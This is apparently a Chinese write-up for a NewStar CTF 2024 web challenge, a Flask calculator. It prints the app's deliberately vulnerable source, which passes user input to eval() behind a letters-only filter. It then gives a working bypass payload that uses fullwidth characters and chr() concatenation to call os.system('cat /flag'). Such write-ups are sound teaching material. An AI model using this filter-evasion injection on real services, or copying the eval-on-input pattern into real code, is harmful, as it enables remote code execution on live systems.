---
titleTemplate: ":title | WriteUp - NewStar CTF 2024"
---

# 臭皮的计算器

开发者工具查看网页源码

![源码](/assets/images/wp/2024/week3/jisuanqi_1.png)

根据提示进入 `/calc` 路由，查看网页源码

![calc 源码](/assets/images/wp/2024/week3/jisuanqi_2.png)

得到了 Python 后端源码

```python
from flask import Flask, render_template, request
import uuid
import subprocess
import os
import tempfile

app = Flask(__name__)
app.secret_key = str(uuid.uuid4())

def waf(s):
    token = True
    for i in s:
        if i in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
            token = False
            break
    return token

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/calc", methods=['POST', 'GET'])
def calc():

    if request.method == 'POST':
        num = request.form.get("num")
        script = f'''import os
print(eval("{num}"))
'''
        print(script)
        if waf(num):
            try:
                result_output = ''
                with tempfile.NamedTemporaryFile(mode='w+', suffix='.py', delete=False) as temp_script:
                    temp_script.write(script)
                    temp_script_path = temp_script.name

                result = subprocess.run(['python3', temp_script_path], capture_output=True, text=True)
                os.remove(temp_script_path)

                result_output = result.stdout if result.returncode == 0 else result.stderr
            except Exception as e:

                result_output = str(e)
            return render_template("calc.html", result=result_output)
        else:
            return render_template("calc.html", result="臭皮！你想干什么！！")
    return render_template("calc.html", result='试试呗')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=30002)
```

审计发现过滤了所有字母，使用全角英文和 `chr()` 字符拼接（或八进制）即可绕过

```python
_＿ｉｍｐｏｒｔ_＿(ｃｈｒ(111)+ｃｈｒ(115)).ｓｙｓｔｅｍ(ｃｈｒ(99)+ｃｈｒ(97)+ｃｈｒ(116)+ｃｈｒ(32)+ｃｈｒ(47)+ｃｈｒ(102)+ｃｈｒ(108)+ｃｈｒ(97)+ｃｈｒ(103))
```

其中 `111 115` 分别对应 `os` 的 ASCII 码，`99 97 116 32 47 102 108 97 103` 分别对应 `cat /flag` 的 ASCII 码

::: warning 注意
发包的时候，加号要做转义处理，否则会被视作空格
:::
